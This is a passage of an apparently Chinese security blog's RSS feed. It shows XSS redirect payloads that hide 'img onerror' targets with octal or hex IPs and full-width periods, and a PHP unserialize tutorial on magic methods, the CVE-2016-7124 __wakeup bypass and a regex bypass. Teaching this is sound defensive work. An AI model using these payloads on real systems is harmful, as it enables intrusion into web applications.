class=&#34;attr&#34;&gt;0177.0.0.01&lt;/span&gt;/`&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;3.hex&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Html&#34;&gt;&lt;figure class=&#34;iseeu highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;img&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;src&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;x&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;onerror&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;document.location&lt;/span&gt;=`&lt;span class=&#34;attr&#34;&gt;http:&lt;/span&gt;//&lt;span class=&#34;attr&#34;&gt;0x7f.0x0.0x0.0x1&lt;/span&gt;/`&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;4.html 标签中用 &lt;code&gt;//&lt;/code&gt;  可以代替 &lt;code&gt;http://&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Html&#34;&gt;&lt;figure class=&#34;iseeu highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;img&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;src&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;x&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;onerror&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;document.location&lt;/span&gt;=`//&lt;span class=&#34;attr&#34;&gt;www.baidu.com&lt;/span&gt;`&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;6. 使用中文逗号代替英文逗号&lt;br&gt;
如果你在你在域名中输入中文句号浏览器会自动转化成英文的逗号&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Html&#34;&gt;&lt;figure class=&#34;iseeu highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;img&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;src&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;x&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;onerror&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;document.location=`http://www。baidu。com`&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;//会自动跳转到百度&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2024/04/09/PHP-Unserialize/</guid>
            <title>PHP Unserialize</title>
            <link>http://example.com/2024/04/09/PHP-Unserialize/</link>
            <pubDate>Tue, 09 Apr 2024 21:51:55 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;php-unserialize&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#php-unserialize&#34;&gt;#&lt;/a&gt; PHP Unserialize&lt;/h1&gt;
&lt;h2 id=&#34;什么是序列化和反序列化&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#什么是序列化和反序列化&#34;&gt;#&lt;/a&gt; 什么是序列化和反序列化&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;serialize&lt;/strong&gt; 将对象格式化成有序的字符串&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;unserialize&lt;/strong&gt; 将字符串还原成原来的对象&lt;/p&gt;
&lt;h3 id=&#34;serialize的特征&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#serialize的特征&#34;&gt;#&lt;/a&gt; serialize 的特征&lt;/h3&gt;
&lt;p&gt;常见的序列化格式有&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;二进制格式&lt;/p&gt;
&lt;p&gt;字节数组&lt;/p&gt;
&lt;p&gt;json 字符串&lt;/p&gt;
&lt;p&gt;xml 字符串&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;常见的数组样例&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Php&#34;&gt;&lt;figure class=&#34;iseeu highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$user&lt;/span&gt;=&lt;span class=&#34;keyword&#34;&gt;array&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;xiao&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;shi&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;zi&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$user&lt;/span&gt;=&lt;span class=&#34;title function_ invoke__&#34;&gt;serialize&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$user&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$user&lt;/span&gt;.PHP_EOL);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;print_r&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;unserialize&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$user&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;输出  &lt;code&gt;a:3:&amp;#123;i:0;s:4:&amp;quot;xiao&amp;quot;;i:1;s:3:&amp;quot;shi&amp;quot;;i:2;s:2:&amp;quot;zi&amp;quot;;&amp;#125;&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Plaintext&#34;&gt;&lt;figure class=&#34;iseeu highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;a:3:&amp;#123;i:0;s:4:&amp;quot;xiao&amp;quot;;i:1;s:3:&amp;quot;shi&amp;quot;;i:2;s:2:&amp;quot;zi&amp;quot;;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;a:array代表是数组，后面的3说明有三个属性&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;i:代表是整型数据int，后面的0是数组下标&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;s:代表是字符串，后面的4是因为xiao长度为4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;数据类型对应提示符&lt;/p&gt;
&lt;p&gt;&lt;code&gt;字符串：s&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;已转义字符串：S&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;整数：i&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;布尔值： b&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;空值：N&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;数组：a&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;对象：O&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;引用： R&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;关于非公有字段名称:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;private&lt;/code&gt;  使用：私有的类的名称 (考虑到继承的情况) 和字段名组合  &lt;code&gt;\x00类名称\x00字段名&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;protected&lt;/code&gt;  使用:  &lt;code&gt;*&lt;/code&gt;  和字段名组合  &lt;code&gt;\x00*\x00字段名&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;魔术方法&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#魔术方法&#34;&gt;#&lt;/a&gt; 魔术方法&lt;/h3&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Plaintext&#34;&gt;&lt;figure class=&#34;iseeu highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;__wakeup() //执行unserialize()时，先会调用这个函数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__sleep() //执行serialize()时，先会调用这个函数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__construct() //构造函数, 在对应对象实例化时自动被调用. #子类中的构	    造函数不会隐式调用父类的构造函数.在 PHP 8 以前, 与类名同名	      的方法可以作为 __constuct 调用但 __construct 方法优先&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__destruct() //对象被销毁时触发&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__call() //在对象上下文中调用不可访问的方法时触发&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__callStatic() //在静态上下文中调用不可访问的方法时触发&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__get() //用于从不可访问的属性读取数据或者不存在这个键都会调用此方法&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__set() //用于将数据写入不可访问的属性&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__isset() //在不可访问的属性上调用isset()或empty()触发&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__unset() //在不可访问的属性上使用unset()时触发&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__toString() //把类当作字符串使用时触发&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__invoke() //当尝试将对象调用为函数时触发&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__debugInfo() //在使用 var_dump, print_r 时会被调用&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__set_state()   // 调用var_export()导出类时，此静态方法会被调用&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__clone()       // 当对象复制完成时调用&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__autoload()    // 尝试加载未定义的类&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h3 id=&#34;反序列化绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#反序列化绕过&#34;&gt;#&lt;/a&gt; 反序列化绕过&lt;/h3&gt;
&lt;h4 id=&#34;php71反序列化对类属性不敏感&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#php71反序列化对类属性不敏感&#34;&gt;#&lt;/a&gt; php7.1 + 反序列化对类属性不敏感&lt;/h4&gt;
&lt;p&gt;我们前面说了如果变量前是 protected，序列化结果会在变量名前加上 &lt;code&gt;\x00*\x00&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;但在特定版本 7.1 以上则对于类属性不敏感，比如下面的例子即使没有 &lt;code&gt;\x00*\x00&lt;/code&gt;  也依然会输出 &lt;code&gt;abc&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Php&#34;&gt;&lt;figure class=&#34;iseeu highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;test&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__construct&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;a = &lt;span class=&#34;string&#34;&gt;&amp;#x27;abc&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt;  &lt;span class=&#34;title&#34;&gt;__destruct&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;a;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;unserialize&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;O:4:&amp;quot;test&amp;quot;:1:&amp;#123;s:1:&amp;quot;a&amp;quot;;s:3:&amp;quot;abc&amp;quot;;&amp;#125;&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h4 id=&#34;绕过__wakeupcve-2016-7124&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#绕过__wakeupcve-2016-7124&#34;&gt;#&lt;/a&gt; 绕过__wakeup (CVE-2016-7124)&lt;/h4&gt;
&lt;p&gt;版本：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;PHP5 &amp;lt; 5.6.25&lt;/p&gt;
&lt;p&gt;PHP7 &amp;lt; 7.0.10&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;利用方式：序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup 的执行&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Php&#34;&gt;&lt;figure class=&#34;iseeu highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;test&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__construct&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;a = &lt;span class=&#34;string&#34;&gt;&amp;#x27;abc&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__wakeup&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;a=&lt;span class=&#34;string&#34;&gt;&amp;#x27;666&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt;  &lt;span class=&#34;title&#34;&gt;__destruct&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;a;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;如果执行 &lt;code&gt;unserialize(&#39;O:4:&amp;quot;test&amp;quot;:1:&amp;#123;s:1:&amp;quot;a&amp;quot;;s:3:&amp;quot;abc&amp;quot;;&amp;#125;&#39;);&lt;/code&gt;  输出结果为 &lt;code&gt;666&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;而把对象属性个数的值增大执行 &lt;code&gt;unserialize(&#39;O:4:&amp;quot;test&amp;quot;:2&amp;#123;s:1:&amp;quot;a&amp;quot;;s:3:&amp;quot;abc&amp;quot;;&amp;#125;&#39;);&lt;/code&gt;  输出结果为 abc&lt;/p&gt;
&lt;h4 id=&#34;绕过部分正则&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#绕过部分正则&#34;&gt;#&lt;/a&gt; 绕过部分正则&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;preg_match(&#39;/^O:\d+/&#39;)&lt;/code&gt;  匹配序列化字符串是否是对象字符串开头，这在曾经的 CTF 中也出过类似的考点&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;・利用加号绕过（注意在 url 里传参时 + 要编码为 %2B）&lt;br&gt;
・serialize (array (a) ) ; // a));//a));//a 为要反序列化的对象 (序列化结果开 头是 a，不影响作为数组元素的 $a 的析构)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Php&#34;&gt;&lt;figure class=&#34;iseeu highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;test&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__construct&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable 